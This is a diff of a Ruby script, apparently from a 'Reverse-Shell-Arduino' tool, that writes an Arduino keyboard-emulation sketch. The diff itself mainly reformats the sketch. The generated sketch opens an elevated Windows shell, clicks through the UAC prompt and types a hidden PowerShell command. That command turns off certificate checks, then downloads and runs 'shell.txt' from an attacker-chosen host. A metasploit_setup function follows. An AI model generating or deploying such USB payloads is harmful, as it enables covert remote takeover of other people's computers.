@@ -5,7 +5,6 @@
 # https://github.com/Sirage7474/Reverse-Shell-Arduino
 require 'base64'
 require 'readline'
-
 def print_error(text)
   print "\e[31m[-]\e[0m #{text}"
 end
@@ -115,37 +114,33 @@ def arduino_setup(host)
   s = "#include <Keyboard.h>\n"
   s << "void setup()\n"
   s << "{\n"
-  s << "  Keyboard.begin();\n"
-  s << "  Keyboard.press(KEY_LEFT_GUI);\n"
-  s << "  delay(1000);\n"
-  s << "  Keyboard.press('x');\n"
-  s << "  Keyboard.releaseAll();\n"
-  s << "  delay(500);\n"
-  s << "  typeKey('a');\n"
-  s << "  delay(100);\n"
-  s << "  Keyboard.press(KEY_LEFT_ALT);\n"
-  s << "  delay(500);\n"
-  s << "  Keyboard.press('y');\n"
-  s << "  Keyboard.releaseAll();\n"
-  s << "  delay(500);\n"
-  s << "  Keyboard.print(\"powershell -windowstyle hidden \\\"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\\\"\");\n"
-  s << "  typeKey(KEY_RETURN);\n"
-  s << "  Keyboard.end();\n"
-  s << "}\n"  # Correct closing brace for setup()
-
-  s << "void loop() {}\n"  # Empty loop because it's not needed
-  
+  s << "Keyboard.begin();\n"
+  s << "Keyboard.press(KEY_LEFT_GUI);\n"
+  s << "delay(1000);\n"
+  s << "Keyboard.press('x');\n"
+  s << "Keyboard.releaseAll();\n"
+  s << "delay(500);\n"
+  s << "typeKey('a');\n"
+  s << "delay(100);\n"
+  s << "Keyboard.press(KEY_LEFT_ALT);\n"
+  s << "delay(500);\n"
+  s << "Keyboard.press('y');\n"
+  s << "Keyboard.releaseAll();\n"
+  s << "delay(500);\n"
+  s << "Keyboard.print(\"powershell -windowstyle hidden \\\"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\\\"\");\n"
+  s << "typeKey(KEY_RETURN);\n"
+  s << "Keyboard.end();\n"
+  s << "}\n"
+  s << "void loop() {}\n"
   s << "void typeKey(int key){\n"
-  s << "  Keyboard.press(key);\n"
-  s << "  delay(500);\n"
-  s << "  Keyboard.release(key);\n"
-  s << "}\n"  # Correct closing brace for typeKey()
-
-  # Write the content to the file
+  s << "Keyboard.press(key);\n"
+  s << "delay(500);\n"
+  s << "Keyboard.release(key);\n"
+  s << "}"
   File.open('reverse_shell_arduino.txt', 'w') do |f|
     f.write(s)
   end
-  print_success("Arduino Sketch File Complete. Please Find 'reverse_shell_arduino.txt'\n")
+  print_success("Arduino Sketch File Complete Please Find 'reverse_shell_arduino.txt'\n")
 end
 
 def metasploit_setup(msf_path, host, port)
